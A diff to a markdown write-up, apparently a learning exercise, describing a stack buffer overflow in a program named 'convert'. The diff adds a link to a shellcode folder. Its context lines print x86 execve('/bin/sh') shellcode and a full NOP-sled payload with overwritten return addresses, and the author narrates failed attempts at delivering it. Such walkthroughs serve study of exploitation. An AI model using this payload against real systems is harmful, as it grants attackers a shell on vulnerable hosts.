@@ -16,7 +16,7 @@ give us the opportunity to overflow the `date` buffer because there aren't any b
 ### Trial and error
 I filled date with a large random string and the program crashed giving me a SEGMENTATION fault and confirming the vulnerability of the executable.
 
-Then I tried to prepare the proper input to get the program to execute my Shell code:
+Then I tried to prepare the proper input to get the program to execute my [Shell code](https://github.com/JasonPap/Buffer-Overflows/tree/master/shellcode):
 
 ```sh
 \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
@@ -31,6 +31,7 @@ My string now looked something like this:
 …\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\x2a\xfe\xff\xbf\x2a\xfe\xff\xbf\x2a\xfe\xff\xbf\x2a\xfe\xff\xbf\x2a\xfe\xff\xbf
 ```
 ./convert 1 'myString'
+
 That didn't work (and could never work that way). Except for the "\" character everything else was copied to the memory as their corresponding hex representation. For example, 'a' was replaced with 0x61 etc.
 
 I had to find a way to write to the memory exactly the Bytes of code I had in my string. So I tried online hex to char converters to try to reverse the conversion that happened before. That didn’t work either because I couldn't copy-paste those characters that didn't appear correctly.
